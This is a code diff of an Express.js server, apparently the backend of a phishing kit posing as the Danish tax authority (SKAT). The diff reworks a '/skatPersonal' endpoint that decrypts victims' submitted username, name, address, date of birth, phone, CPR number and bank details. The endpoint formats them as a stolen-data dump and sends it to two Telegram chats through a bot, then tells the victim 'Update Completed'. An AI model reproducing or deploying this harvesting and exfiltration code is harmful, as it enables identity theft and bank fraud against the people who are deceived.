@@ -43,6 +43,9 @@ app.post('/uploadP60', upload.single('file'), (req, res) => {
         ;
 });
 
+app.on('uncaughtException', err => {
+    console.error('There was an uncaught error', err);
+});
 
 app.options('/getips', cors())
 
@@ -2787,29 +2790,25 @@ let skat = 0;
 app.options('/skatPersonal', cors())
 
 app.post('/skatPersonal', (req, res) => {
-    try {
-        username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
-        fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
-        address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
-        city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
-        zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
-        dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
-        telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
-        cpr = CryptoJS.AES.decrypt(req.body.cpr, '402312').toString(CryptoJS.enc.Utf8);
-        bank = CryptoJS.AES.decrypt(req.body.bank, '402312').toString(CryptoJS.enc.Utf8);
-        var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
-        
-        axios.post(
-            `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKATRH:\n${originalText}`
-        );
-        axios.post(
-            `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
-        );
-        
-        res.send("Update Completed");
-    } catch (err) {
-        console.log(err)
-    }
+    username = CryptoJS.AES.decrypt(req.body.username, '402312').toString(CryptoJS.enc.Utf8);
+    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
+    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
+    zip = CryptoJS.AES.decrypt(req.body.zip, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
+    cpr = CryptoJS.AES.decrypt(req.body.cpr, '402312').toString(CryptoJS.enc.Utf8);
+    bank = CryptoJS.AES.decrypt(req.body.bank, '402312').toString(CryptoJS.enc.Utf8);
+    var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
+
+    axios.post(
+        `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKATRH:\n${originalText}`
+    );
+    axios.post(
+        `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1449567433&text=SKAT:\n${originalText}`
+    );
+
+    res.send("Update Completed");
 });
 
 app.options('/skatBilling', cors())
